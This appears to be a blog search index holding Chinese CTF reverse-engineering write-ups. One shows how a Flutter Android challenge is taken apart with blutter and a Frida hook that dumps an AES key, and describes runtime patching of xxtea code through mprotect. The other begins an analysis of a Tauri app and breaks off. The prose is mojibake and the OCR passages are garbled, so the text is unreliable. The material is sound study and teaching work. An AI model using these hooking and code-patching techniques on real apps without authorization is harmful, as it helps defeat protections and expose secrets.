<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>ã€Flutterã€‘Flutteråˆè§-.WM-Want2BecomeMagicalGirl</title>
      <link href="/2026/01/04/%5BFlutter%5DFlutter%E5%88%9D%E8%A7%81-.WM-Want2BecomeMagicalGirl/"/>
      <url>/2026/01/04/%5BFlutter%5DFlutter%E5%88%9D%E8%A7%81-.WM-Want2BecomeMagicalGirl/</url>
      
        <content type="html"><![CDATA[<h2 id="flutter"><a href="#flutter" class="headerlink" title="flutter"></a>flutter</h2><p>flutter æ¡†æ¶å¼€å‘çš„ appï¼Œæ‰“åŒ…åï¼Œä¼šå°†ä»£ç æ‰“åŒ…æˆ soï¼Œè€Œä¸”ä¼šå°†æ¥å£è¯·æ±‚æ·»åŠ è¯ä¹¦æ ¡éªŒï¼Œé˜²æ­¢ä¸­é—´äººæ”»å‡»ï¼Œæ™®é€šæ–¹æ³•æ˜¯æŠ“ä¸åˆ°åŒ…çš„ã€‚æ— å½¢ä¸­å¢åŠ äº†é€†å‘çš„éš¾åº¦ï¼Œè¯´å¥é¢˜å¤–è¯ï¼Œç”¨ Flutter æ¡†æ¶å¼€å‘ï¼Œä¸ä»…å¯ä»¥è·¨å¹³å°ï¼Œè¿˜å¢åŠ äº†å®‰å…¨æ€§ğŸ‘ã€‚ Flutter æ¡†æ¶å¼€å‘çš„é¡¹ç›®ï¼Œæ‰“åŒ…åä¼šç”Ÿæˆä¸¤ä¸ª soï¼Œåˆ†åˆ«æ˜¯ <code>libapp.so</code>å’Œ <code>libflutter.so</code>ï¼Œå‰è€…æ˜¯ä¸šåŠ¡ç›¸å…³çš„ï¼Œåè€…æ˜¯ Flutter å¼•æ“ç”¨åˆ°çš„ã€‚ ç”¨ IDA æ‰“å¼€<code>libapp.so</code>ï¼Œä¼šå‘ç°å‡½æ•°åéƒ½è¢«æ··æ·†äº†ï¼Œè¿™æ—¶å°±è¦å€ŸåŠ©å¼€æºæ¡†æ¶<a href="https://link.juejin.cn/?target=https://github.com/worawit/blutter">B(l)utter</a>æ¥è¿˜åŸæ··æ·†çš„å‡½æ•°åäº†ã€‚</p><p><a href="https://link.juejin.cn/?target=https://github.com/worawit/blutter"><font style="color:rgb(2, 105, 200);">B(l)utter</font></a><font style="color:rgb(37, 41, 51);">å®˜ç½‘æœ‰å®‰è£…å’Œä½¿ç”¨æ–¹æ³•ï¼ŒLinuxã€windows å’Œ mac éƒ½è¡Œ</font></p><h2 id="WM-Want2BecomeMagicalGirl-ï¼ˆæƒ³è¦æˆä¸ºé©¬çŒ´çƒ§é…’ï¼‰"><a href="#WM-Want2BecomeMagicalGirl-ï¼ˆæƒ³è¦æˆä¸ºé©¬çŒ´çƒ§é…’ï¼‰" class="headerlink" title="WM-Want2BecomeMagicalGirl.ï¼ˆæƒ³è¦æˆä¸ºé©¬çŒ´çƒ§é…’ï¼‰"></a>WM-<strong><font style="color:rgb(31, 35, 40);">Want2BecomeMagicalGirl.ï¼ˆæƒ³è¦æˆä¸ºé©¬çŒ´çƒ§é…’ï¼‰</font></strong></h2><p>jadxæ‰“å¼€ï¼ŒæŸ¥çœ‹libï¼Œæœ‰flutter.soï¼Œå…¸å‹çš„flutteræ€ç»´</p><!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼šSTYLE èµ„æºæ–‡ä»¶ ASSETS KOTLIN 1IB ARM64-V8A LIBAPP.SO 01 LIBFLUTTER.SO 35 LIBNATIVE ADD.SO META-INF --><p><img src="https://cdn.nlark.com/yuque/0/2025/png/46253401/1758958639896-b9102fa6-d677-4658-a4e5-7c0962ccbac0.png"></p><p>ç›´æ¥ç”¨blutterï¼Œåˆ©ç”¨blutter_dumpå‡ºæ¥çš„æ–‡ä»¶è¿˜åŸéƒ¨åˆ†å­—ç¬¦ï¼Œè¿˜åŸæŸ¥çœ‹æœ‰æ²¡æœ‰å…³é”®è¯ã€‚</p><!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼šè™šæ‹Ÿæœº(F:)>BLUTTER-MAIN æ­¤ç”µè„‘ OUT DIR ä»† æ’åº ä¸‰æŸ¥çœ‹ ç±»å‹ ä¿®æ”¹æ—¥æœŸ åç§° å¤§å° æ–‡ä»¶å¤¹ 2025/9/26 20:08 ASM æ–‡ä»¶å¤¹ IDA SCRIPT 2025/9/26 20:08 BLUTTER FRIDA.JS 2025/9/26 20:08 191 KB JAVASCRIPTæºæ–‡ä»¶ æ–‡æœ¬æ–‡æ¡£ OBJS.TXT 2025/9/26 20:08 289 KB æ–‡æœ¬æ–‡æ¡£ 2025/9/26 20:08 754 KB PP.TXT --><p><img src="https://cdn.nlark.com/yuque/0/2025/png/46253401/1758958858528-49172449-cc77-4e72-b2c5-c373f4f2682d.png"></p><!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼šMAGICALLGIRL$EDITVIEW_MYEDITTEXTSTATE BUI1D 28B848 CLOSURE 28BD18 MAGICALLGIRL$EDITVIEW MYEDITTEXTSTATE ANON 1LGIRL$EDITVIEW_MYEDITTEXTSTATE CLOSURE_28BDBE MAGI CAL ANON_ CHECK 28BEA8 LLGIRL$EDITVIEWMYEDITTEXTSTATE MAGICAL MAGICAL_GIRL$NULL_SUBO__SEND 280344 1_GIRL$EDITVIEW MYEDITTEXTSTATE_UINT8LISTTOHEX 280484 MAGI CAL MAGICAL GIRL$AES CRYPT NULL SAFE AESCRYPT AESENCRYPT 28C648 MAGICAL GIRL$AES_CRYPT NULL SAFE AES _AESENERYPT 28CBEC 1LGIRL$AES_CRYPT_NULL_SAFE_AES AES_ AESENCRYPTBLOCK_28D5BC MAGI CAL MAGICAL_ZIRL$AES_CRYPT_NULL_SAFE_AES_ MIXCOLUMNS_28D8B0 LTABLE_28F11C MAGICAL GIRL$AES_CRYPT NULL SAFE AES SHIFTROWS 28FFB4 LGIRL$AES_CRYPT_NULL_SAFE_ AES_ MAGI CAL 1_GIRL$AES_CRYPT_NULL_SAFE_AES. SUBBYTES 2901B8 MAGI CAL ADDROUNDKEY 291204 MAGICAL GIRL$AES_CRYPT NULL SAFE AES MAGICAL GIRL$AES ORYPT-MILL SAFE AESCRYPTARGUMENTERROR -CHECKHLLOREMPTY 291434 MAGICAL GIRL$EDITVIEW MYEDITTEXTSTATE PADTOBLOCKSIZE 291484 MAGICAL GIRL$AES CRYPT NULL SAFE AESCRYPT AESSETHODE 291548 MAGICAL GIRL$AES_CRYPT_NULL_SAFE_AES_ AESSETHODE 29158C NAGICAL GIRL$AES CRYPT NULL SAFE AESCRYPT AESSETKEYS 2915A4 MAGICAL GIRL$AES_CRYPT NULL SAFE AES AESSETKEYS 2915F4 MAGICAL GIRL$AES_CRYPT NULL SAFE AES AESKEYEXPANSION 291B1C MAGICAL GIRL$AES_CRYPT NULL_SAFE_AESCRYPT_CTOR 293680 MAGICAL GIRL$AES_CRYPT NULL_SAFE AESCRYPT SETUSERDATA 2937A0 MAGICAL GIRL$AES_CRYPT NULL SAFE STRINGEXTENSION.TOUTF8BYTES 2938E8 1_GIRL$AES_CRYPT_NULL_SAFE_ STRINGEXTENSION.TOUTF16BYTES_293928 MAGI CAL MAGICAL_GIRL$AES CRYPT NULL SAFE _ANON_CLOSURE 293A4C ANON CLOSURE 293EB8 MAGICAL GIRL$EDITVIEW MYEDITTEXTSTATE MAGICAL ZIRL$EDITVIEW MYEDITTEXTSTATE ANON CLOSURE 293E3C MAGICAL GIRL$EDITVIEW MYEDITTEXT_CREATESTATE 2AD150 MAGICAL GIRL$EDITVIEW MYEDITTEXTSTATE_CTOR 2AD198 ENUMTOSTRING 2EDF GIRL$AES CRYPT NULL SAFE AESMODE MAZI CAL --><p><img src="https://cdn.nlark.com/yuque/0/2025/png/46253401/1758958976051-0f5cc5f7-1228-4225-bc54-73a8095d58c5.png"></p><p>æœç´¢appçš„å…³é”®è¯åï¼Œæ˜æ˜¾èƒ½çœ‹è§è¿™æ˜¯ä¸€ä¸ªaesåŠ å¯†ï¼ŒåŠ å¯†æ¨¡å¼ä¸ºecbï¼Œåœ¨dumpä¸‹æ¥çš„pp.txtä¸­å°±æœ‰  </p><!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š[PP+OXB708] STRING: THE INITIALIZATION VECTOR IS EMPTY,IT CAN NOT BE EMPTY WHEN AES MODE IS NOT ECB:" [PP+OXB710] STRING:"LNVALID DATA LENGTH FOR AES:" [PP+OXB718]STRING:"BYTES." [PP+0XB720] FIELD < AES@409289871. ITABLE@409289871>: STATIC LATE FINAL (OFFSET:OXABC) [PP+OXB728] FIELD < AES@409289871. ATABLE@409289871>:STATIC LATE FINAL (OFFSET:OXA70) --><p><img src="https://cdn.nlark.com/yuque/0/2025/png/46253401/1758959369993-e5ce138f-3d60-466c-8f29-65209a26408a.png"></p><p>ä½†æ˜¯è¿™ä¸ªaesåŠ å¯†çš„å¯†é’¥æ˜¯ä»ä¸­å¦ä¸€ä¸ªsoä¸­æ‹‰å–è¿‡æ¥çš„</p><!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š(PP+OXB/10) FIELD<:AES@4092898/1:NKQ4092898/1>:TATE (OFTSET:OXB) [PP+0XB778] FIELD <... BINDINGS@408334904>: STATE FINAL(OFFSET:OXA64) [PP+0XB780] FIELD <NATIVEADDBINDINGS. GETKEY@412383114>:LATE FINAL (OFFSET:OX18) [PP+0XB788) FIELD (NATIVEADDBINDINGS.GETKEYPTR@412383114>:LATE FINAL (OFFSET:OX14) T]NATIVEAD IBINDINGS:::GE :GETKEY(0X2921BC) IPP:OXB/9D ANONYMOUSGIOSURE,  OX292234), IN (PACKAGEINATVE,ADD/DATIVE,ADD,BINDINGS,GENERATED DART)N LATIVEFUNCTION<(DYNAMIC THIS)POINTER<UINT8>>>>>>> TPP+0XB79C] [PP+0XB7A0] STRING:"GENKEY" 334904>: STATIC LATE FINAL (OFFSET:0XA60) [PP+OXB7A [PP+OXB7BO] ANONYMOUSCLIBRARE:(OX292420),IN [DART:FF) DYNAMICLIBRARY:LOOKUP (OX2924BC) [PP+0XB7B8]NATIVEFN:[N N:[NO NAME] AT 0X7FF71E9FC4D0 STUB:CALLBOOTSTRAPNATIVE (OX173FEC) [PP+OXB7CO] [PP+OXB7C8] TYPE: POINTER<YO BOUND NATIVETYPE> [PP+OXB7DO]NULL --><p><img src="https://cdn.nlark.com/yuque/0/2025/png/46253401/1758959489165-f46443c3-d370-41b8-80a3-1e482d5f93e0.png"></p><p>è¿™ä¸ªrc4æ‰§è¡Œå®Œçš„ç»“æœå°±æ˜¯aesçš„å¯†é’¥çš„ä¸€éƒ¨åˆ†ï¼Œå…¨éƒ¨çš„å¯†é’¥è¿˜æ˜¯éœ€è¦fridaæ¥æŠ“ï¼Œè¿™é‡Œä½¿ç”¨blutterç»™çš„fridaè„šæœ¬æŠ“å°±è¡Œæ”¹ç‚¹å‚æ•°  </p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">onLibappLoaded</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="comment">// xxx(&quot;remove this line and correct the hook value&quot;);</span></span><br><span class="line">  <span class="keyword">const</span> fn_addr = <span class="number">0x28c6a8</span>;</span><br><span class="line">  <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(libapp.<span class="title function_">add</span>(fn_addr), &#123;</span><br><span class="line">    <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">      <span class="title function_">init</span>(<span class="variable language_">this</span>.<span class="property">context</span>);</span><br><span class="line">      <span class="keyword">let</span> objPtr = <span class="title function_">getArg</span>(<span class="variable language_">this</span>.<span class="property">context</span>, <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">const</span> [tptr, cls, values] = <span class="title function_">getTaggedObjectValue</span>(objPtr);</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`<span class="subst">$&#123;cls.name&#125;</span>@<span class="subst">$&#123;tptr.toString().slice(<span class="number">2</span>)&#125;</span> =`</span>, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(values, <span class="literal">null</span>, <span class="number">2</span>));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š"OFF_1C!_UINT8LIST@6D006559F9":[ 122, 37, 197, 36, 198, 51, 76, 48, 243, 98, 175, 172, 63, 35, 3, 213 --><p><img src="https://cdn.nlark.com/yuque/0/2025/png/46253401/1758965294198-6c088447-44fa-41c6-8215-b8d2b7c8f25f.png"></p><!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼šV14; BOOL INT V15;// W13 INT V16;//W13 INT128 V18; // [XSP+EH][XBP-230H] BYREF _INT64 V19;//[XSP+18H][XBP-218H] BYREF [XSP+20H][XBP-210H] BYREF [XSP+120H][XBP-110H] BYREF INT64 V22; // [XSP+228H][XBP-8H] (_READSTATUSREG(TPIDR ELE)+ 40); LACIGAM': 'DOUWANTMAGIC': _STRLEN_CHK(&V18,16); SET(V20,0,SI2EOF(V20)); STRLEN_CHK(&V19.8); : EMSET(V21,0,SI2EOF(V21); V32V20+N256; +V3N256; V4*(&V19+N256%V1); V5 (N256+1) % V1; / 1: V3(1] J-N256 V6äºŒ V21 11256: N256 2LL TV6 V6[1]*(&V19+V5); WHILE ( N256 !- 256); 1256138: åå“å“ è„‚è‚ªä»£å¯å¯å¯ä»¥GTGBRATTHWHTHWWTTT V9*(V20+N256_1); V8 + V9 + *(V21 + N256_1); *(V20+N256_1++) *(V20+VB)-V9; WHILE(N256_1 !: 256); IF(VE<<32) V10-0; V11-0: V12&18 V13-VO: OO V15-++V10; V14--V10<0; V10 V10: IF(!V14 V10-V15; $MN77H77 -V13: V10); *(V20 V16: V11); (V20 V10) (V20 LV20 V11) 20 +(*(V20+ V10) + V16)); TV20 (V12+1); å8 V13 ); WHILE 79 --><p><img src="https://cdn.nlark.com/yuque/0/2025/png/46253401/1758959127560-07d68f51-d8cf-4ce1-81c2-2623ebfd953d.png"></p><p>åšå®Œè¿™å±‚åŠ å¯†åä¼šå‘ç°ç„¶åè¦å»javaå±‚ä¸­åšxxteaï¼Œä½†æ˜¯é™æ€çš„xxteaå’ŒåŠ¨æ€æ‰§è¡Œçš„ä¸ä¸€æ ·ï¼Œåœ¨libnative_add.soä¸­</p><p>çš„.init_procå‡½æ•°ä¸­æœ‰ä¸€ä¸ªhookå§xxteaçš„åŠ å¯†è¿›è¡Œæ›´æ”¹ï¼Œsub_1A51Cæ˜¯å…·ä½“çš„æ›´æ”¹å‡½æ•°</p><!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼šSUB 19B50(LIBART SO, 114514); 41 VEORQ_SB(L,SHELLCODE_END_); V1 V2-VO; *S2 - VEORQ 58(V1,VQTBLIQ_S8(XMMWORD_10150, SHELLCODE_END ç«–+å¥¶å¦‚å¦‚ä½ æ‰€ V26 : VEORQ_S8(V1. VQTBL1Q_58(XMMWORD_1027E, SHELLCODE_END_) :VEORQ_S8(V1,VQTBL1Q_58(XMMMORD_10100, SHELLCODE_END_) V27 :VEORQ_58(V1,VQTBL1Q_58(XMMORD_10180, SHELLCODE_END_END_) V28 -VEORQ_58(V1,VQTBLIQ_58(XMMRWORD_101DE, SHELLCODE_END_) 4444444400%è„‚è‚ªçš„è‡ªç”±44%çš„çš„Mçš„44444% - VEORQ_S8(V1, VQTBL1Q_58(XMMWORD_10130, SHELLCODE_END_) - VEORQ_S8(V1, VQTBL1Q_S8(X XMWORD_10190, SHELLCODE_END_) S VEORQ_SB(V1,VQTBLIQ_SB(X 10260,SHELLCODE_END_)); XITIWO SUB_19F78(VE,S2); !V3_) VEORQ_SB(1, SHELLCODE_END_); V4 VQTBL1Q_S8(XMMWORD_10150, SHELLCODE_END_)); *S2 VEORQ_S8(V4 -VEORQ_SB(V4,VQTBL1Q_SB(X) 8(XMMWORD_10270, SHELLCODE_END_)); - IR VEORQ_S8(V4,VQTBLIQ_58(XNMMORD_10120, SHELLCODE_END_)); V20-VEORQ_SB(V 101E0, SHELLCODE END_); 8(V4, VQTBL1Q_S8(XMMWORD 101A0. SHELLCODE_END_); VEORQ_SB(V4 V21 VQTBLIQ_SB(XMMWORD_ (XMMWORD_10230, SHELLCODE_END_)); V22 : VEORQ_S8(V4, VQTBL1Q_SB(XMM D_10200, SHELLCODE_END_); V23 :VEORQ_SB(V4, VQTBL1Q_SB(XMWORD_102 V24 101BO, ,SHELLCODE_END_)); VEORQ_SB(V4,VQTBLIQ_S8(XMMWORD.1 V3 SUB_19F78(V2,S2_1); V5 - VEORQ_S8(L, SHELLCODE_END_); +52_1 - VEORQ_S8(V5, VQTBLIQ_SB(XNMWORD_1011E, SHELLCODE_END_)); V18 : VEORQ.S8(V5, VQTBL1Q_58(XMMWORD_1021E, SHELLCODE_END.)); V19 - VEORQ_58(V5,VQTBL1Q_58(XMNIWORD_1016E, SHELLCODE_END_)); , S2_1); OFF_41F40 - SUB_19F78(V2, PAGESIZE - GETPAGESIZE(); (_NR MAP,O,PA PAGESI2E,7,34,0,0); S LINUX EABI SYSCALL( MEMSET(S,O,PAGESI2E); IRT_, &SHELLCODE_END_ - &SHELLCODE_START_); MEMCPY(S,&SHELLCODE START_. JMP_ADDR_:S &SHELLCODE START_]-SUB 1A51C; &S&THEFUNC ADDR é¾™ä¸‡é¾™ &S&END_FUNC_ADDR &SHELLCODE_START_]-SUB_1A6EO; &S[&RETBACK_ADDR_ &SHELICODE START_] ä¸‰V3+16; 79 &SHELLCODE START V8-&ORI INS SET1 + 8: 80 &S_&ORI_INS SET1 &SHELLCODE_START_ &S[V8]: 81 V9 - LINUX_EABI_SYSCALL(_NR MPROTECT, (-PAGESIZE & V3), PAGESIZE, 7); 82 *V3-TRAMPOLINE_; 83 *(V3+8)-JMP_ADDR_; 84 YEAVE VEORGHERCOSHPARTEGDE-ENDTEITCODE,START 85 86 452_2 - VEORQ_58(V1E,VQTBLIQ.58(XNMWORD_101CE, SHELLCODE_END_)); 87 BB VIS - VEORG-SB(VIE VGEBLIG-SB(XMUNTWORD 10178:SHELLEODE-END-); 89 V16- 98 SUB_19F78(V2,S2_2); V11 LINUX_EABI_SYSCALL(_NR_MMAP, O, O, PAGESIZE, 7, 34, 0, 0); IS S_1 88586688 MEMSET(S 1,0,PAGESI2E); ,SHELLCODE_END_- &SHELLCODE_START_); MEMCPY(S_1,&SHELLCODE_START JMP_ADDR_:S_1; &SHELLCODE_START_] SUB_1A710; *&S1 _1[&THE_FUNC_ADDR. S_1[&END_FUNC_ADDR_ &SHELLCODE_START_] SUB_1A76C: &SHELLCODE_START V11+16: 1[&RETBACK_ADDR &SHELICODE_START 1[&ORI_INS SET1 *V11; --><p><img src="https://cdn.nlark.com/yuque/0/2025/png/46253401/1758959728055-a1518672-186b-4d83-ac90-8dfff9bb41e2.png"></p><p><strong>ä¿®æ”¹</strong>ï¼šå¯¹ <strong>æŒ‡ä»¤é¡µ</strong>ï¼ˆ<code>v3 = code_item-&gt;insns</code>ï¼‰<code>mprotect</code> æˆ RWXï¼Œéå†å‰ <strong>0xA0 å­—èŠ‚</strong>ï¼Œåªå¯¹å‘½ä¸­çš„åŠå­—åŠ¨æ‰‹ï¼š</p><ul><li><code>0x??B3</code> â†’ <code>0x??B2</code></li><li><code>0x??E0</code> â†’ <code>0x??E2</code><br>åŒæ—¶æŠŠåŸå­—èŠ‚å¤‡ä»½åˆ° <code>.data</code>ï¼Œä»¥ä¾¿éšæ—¶å›æ»šã€‚</li></ul><!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼šV6 - VQTBLIQ_SB(XMMWORD_10240, SH 240. SHELICODE_ER IF(V21[O]&1)!0) HAYSTACK  HAYSTACK 1; 38 ELSE 39 HAYSTACK     + 1 ; *NEEDLE -VEORQ_SB(V5,V4); å¤šåŠ å¤šåŠ å¤šçš„88555556660000001110 *NEEDLE_1-VEORQ_SB(V5,V6); IF ( HAYSTACK ) IF ( STRSTR(HAYSTACK, NEEDLE) ) QWORD 41F5BV3; PAGESI2E GETPAGESI2E(); +2 ) FOR(I E;I I                                                                                           VIL - LINUX EABI_SYSCALL(_NR_MPROTECT, (-PAGESIZE & V3), PAGESIZE, 7); NEXB3 *(V3+1); *(&XMWORD_41F60 + 1) - NOXB3; IF(N0XB3 WW 0XB3 NEXE0 NEXB3&0XFFB2: ELSE NEXEE NEXB3: IF(N0XB3MW00XB3 EXEO NEXEE IF(NEXEE WWWWEE) NEXEO 2U: (V3+1) - NEXEO: ELSE IF ( STRSTR(HAYSTACK, NEEDLE_1) ) --><p><img src="https://cdn.nlark.com/yuque/0/2025/png/46253401/1758960028163-ab8092e5-b41f-488d-b404-7f1a822a45cd.png"></p><p>è¿™é‡Œå¤§ä½¬æ˜¯ç”¨åŠ¨è°ƒdumpç¡®è®¤çš„ï¼Œä¸‹é¢æ˜¯åŠ¨è°ƒåçš„æ›´æ”¹ç»“æœ</p><!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š --><p><img src="https://cdn.nlark.com/yuque/0/2025/webp/46253401/1758959788003-89ca49c7-3434-448b-8024-a4cfce2b8884.webp"></p><p>ç„¶åå†æŠŠåŠ å¯†åçš„å¯†æ–‡è¿›è¡Œbase64</p><p>æœ€ç»ˆå¯†æ–‡å¯ä»¥åœ¨pp.txtè¿›è¡ŒæŸ¥çœ‹</p><!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼šOFF 2C.FALSE [PP+OXB6AO] LIST(11)[0,0X4,0X4, 0X1,"COMPOSING",OX3,"SELECTION , OX2,"TEXT ,OX1,NULL] (PP:ONBSAEL ANOUSCLOSUREMDARE:(OZ293EBE)  IN   IN   PACKAGISAL,GINVTEMDARTIL MVEDITTEICHECK 0728BEAD (PP:OXB650) ANONYMOUSOOSUS;   OR29333333338BEAPEMAGEMAGISAL,SULLVIEWSDART MVEDITTEICHECK OR38BEAD VE BECOME A MAGICAL GIRL !!" G:"YOU HAVE [PP+OXB6CO]STRING: [PP+0XB6C8] STRING: "THIS SPELL HAS NO MAGIC POWER" @44F211: [PP+OXB6D0] OBJ!METHODCHANNEL OFF8:"TO", OFF.C.OBJ!STANDARDMETHODCODEC@44F3D1 [PP+OXB6D8]NULL (PP+0XB6E0L STRING:"" --><p><img src="https://cdn.nlark.com/yuque/0/2025/png/46253401/1758960088138-5531a27a-e7f1-40c1-b153-e41ba487612d.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Flutter </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€L3Hã€‘ã€Tauriã€‘easy_android</title>
      <link href="/2026/01/04/%5BL3H%5Deasy_android/"/>
      <url>/2026/01/04/%5BL3H%5Deasy_android/</url>
      
        <content type="html"><![CDATA[<h1 id="L3H-easy-android"><a href="#L3H-easy-android" class="headerlink" title="[L3H]easy_android"></a>[L3H]easy_android</h1><h6 id="é¢˜ç›®å®é™…ä¸Šä¸éš¾ï¼Œæ‰¾åˆ°å…³é”®è¯è·Ÿè¿›ç”šè‡³ä¸ç”¨ç®¡ä»–çš„é€»è¾‘å’Œæ¶æ„ä¸¢ç»™aiä¸€æŠŠæ¢­"><a href="#é¢˜ç›®å®é™…ä¸Šä¸éš¾ï¼Œæ‰¾åˆ°å…³é”®è¯è·Ÿè¿›ç”šè‡³ä¸ç”¨ç®¡ä»–çš„é€»è¾‘å’Œæ¶æ„ä¸¢ç»™aiä¸€æŠŠæ¢­" class="headerlink" title="~~ é¢˜ç›®å®é™…ä¸Šä¸éš¾ï¼Œæ‰¾åˆ°å…³é”®è¯è·Ÿè¿›ç”šè‡³ä¸ç”¨ç®¡ä»–çš„é€»è¾‘å’Œæ¶æ„ä¸¢ç»™aiä¸€æŠŠæ¢­~~"></a>~~ é¢˜ç›®å®é™…ä¸Šä¸éš¾ï¼Œæ‰¾åˆ°å…³é”®è¯è·Ÿè¿›ç”šè‡³ä¸ç”¨ç®¡ä»–çš„é€»è¾‘å’Œæ¶æ„ä¸¢ç»™aiä¸€æŠŠæ¢­~~</h6><p>åŸºæœ¬æ“ä½œï¼šæ”¾è¿›jadxä¸­ï¼Œè·Ÿè¿›é€»è¾‘ï¼Œæœ‰loadåŠ è½½nativeæ–¹æ³•ï¼Œå§libæ–‡ä»¶ä¸­çš„soæ–‡ä»¶ç”¨idaæ‰“å¼€æŸ¥çœ‹é€»è¾‘</p><h2 id="javaå±‚ï¼š"><a href="#javaå±‚ï¼š" class="headerlink" title="javaå±‚ï¼š"></a>javaå±‚ï¼š</h2><p>å…ˆæ˜¯æŸ¥çœ‹ä¸»ç±»ï¼Œå‘ç°æ˜¯ä¸»ç±»ç›´æ¥ç»§æ‰¿äº†TauriActivityè¿™ä¸ªç±»ï¼Œç–‘ä¼¼ä½¿ç”¨äº†tauriæ¡†æ¶ã€‚<del>(éƒ½å­¦è¿‡javaï¼Œåˆ«å‘Šè¯‰æˆ‘ä¸çŸ¥é“ç»§æ‰¿æ˜¯ä»€ä¹ˆ</del></p><!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š --><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/202507240937236.png"></p><h2 id="ä»€ä¹ˆæ˜¯Tauri"><a href="#ä»€ä¹ˆæ˜¯Tauri" class="headerlink" title="ä»€ä¹ˆæ˜¯Tauri"></a>ä»€ä¹ˆæ˜¯Tauri</h2><p><a href="https://github.com/tauri-apps/tauri/">https://github.com/tauri-apps/tauri/</a></p><p>Tauri æ˜¯ä¸€ä¸ªå¤šè¯­è¨€ä¸”é€šç”¨çš„å·¥å…·åŒ…ï¼Œéå¸¸çµæ´»ï¼Œå…è®¸å·¥ç¨‹å¸ˆå¼€å‘å„ç§ç±»å‹çš„åº”ç”¨ã€‚å®ƒç”¨äºæ„å»ºæ¡Œé¢åº”ç”¨ç¨‹åºï¼Œç»“åˆäº† Rust å·¥å…·å’Œ Webview ä¸­æ¸²æŸ“çš„ HTMLã€‚ä½¿ç”¨ Tauri æ„å»ºçš„åº”ç”¨å¯ä»¥åŒ…å«ä»»æ„æ•°é‡çš„å¯é€‰ JS API&#x2F;Rust APIï¼Œä»¥ä¾¿ Webview å¯ä»¥é€šè¿‡æ¶ˆæ¯ä¼ é€’æ§åˆ¶ç³»ç»Ÿã€‚å®é™…ä¸Šï¼Œå¼€å‘è€…å¯ä»¥æ‰©å±•é»˜è®¤ API ä»¥æ·»åŠ è‡ªå·±çš„åŠŸèƒ½ï¼Œå¹¶è½»æ¾åœ°æ¡¥æ¥ Webview å’ŒåŸºäº Rust çš„åç«¯ã€‚</p><p>Tauri åº”ç”¨ä¸­çš„ç”¨æˆ·ç•Œé¢ç›®å‰åˆ©ç”¨ <code>tao</code> ä½œä¸º macOSã€Windowsã€Linuxã€Android å’Œ iOS çš„çª—å£å¤„ç†åº“ã€‚ä¸ºäº†æ¸²æŸ“åº”ç”¨ï¼ŒTauri ä½¿ç”¨ WRY åº“ï¼Œè¯¥åº“æä¾›äº†ä¸€è‡´æ¥å£ä»¥ç³»ç»Ÿ WebViewï¼Œåœ¨ macOS &amp; iOS ä¸Šåˆ©ç”¨ WKWebViewï¼Œåœ¨ Windows ä¸Šåˆ©ç”¨ WebView2ï¼Œåœ¨ Linux å’Œ Android ä¸Šåˆ©ç”¨ WebKitGTKï¼Œåœ¨ Android ä¸Šåˆ©ç”¨ Android System WebViewã€‚</p><p>Tauriæ¡†æ¶æµç¨‹å¤§è‡´æ˜¯ Tauriâ€¯â†’â€¯Wryæ¡¥â€¯â†’â€¯Rust</p><h2 id="è¿›è¡Œåˆ†æ"><a href="#è¿›è¡Œåˆ†æ" class="headerlink" title="è¿›è¡Œåˆ†æ"></a>è¿›è¡Œåˆ†æ</h2><p>è·Ÿè¿›æŸ¥çœ‹TauriActivityï¼Œæˆ‘ä»¬å¯ä»¥æ¸…æ™°çš„çœ‹åˆ°ä»–å¯¼å…¥äº†ä¸¤ä¸ªtauriæ¡†æ¶çš„åŒ…ï¼Œä»–æ˜¯ <strong>Tauri-Android</strong> åº”ç”¨ç”Ÿæˆçš„å£³ Activityã€‚å®ƒæŠŠç³»ç»Ÿçš„ç”Ÿå‘½å‘¨æœŸäº‹ä»¶ç®€å•åœ°â€œè½¬å‘â€ç»™ Tauri&#x2F;Capacitor çš„æ’ä»¶ä½“ç³»ï¼Œè®©æ¯ä¸ªæ’ä»¶éƒ½æœ‰æœºä¼šåŒæ­¥è‡ªå·±çš„çŠ¶æ€ã€‚åŒæ—¶å‘ç°å®ƒåˆç»§æ‰¿äº†WryActivity ç±»ã€‚</p><!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š --><p><img 